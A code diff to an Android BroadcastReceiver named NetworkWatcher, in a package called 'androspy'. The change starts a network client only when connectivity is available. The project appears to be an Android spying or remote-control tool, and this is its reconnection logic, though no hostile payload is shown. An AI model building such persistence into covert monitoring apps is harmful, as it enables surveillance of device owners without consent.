@@ -13,17 +13,16 @@ public class NetworkWatcher extends BroadcastReceiver {
         this.context = context;
         System.out.print("Network Watcher running.............");
 
-        startClient();
 //        here, check that the network connection is available. If yes, start your service. If not, stop your service.
-//        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-//        NetworkInfo info = cm.getActiveNetworkInfo();
-//        if (info != null) {
-//            if (buddy.ap.com.androspy.BuildConfig.DEBUG) {
-//                startClient();
-//            }else if (info.isConnected()) {
-//                startClient();
-//            }
-//        }
+        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo info = cm.getActiveNetworkInfo();
+        if (info != null) {
+            if (buddy.ap.com.androspy.BuildConfig.DEBUG) {
+                startClient();
+            }else if (info.isConnected()) {
+                startClient();
+            }
+        }
     }
 
     void startClient() {
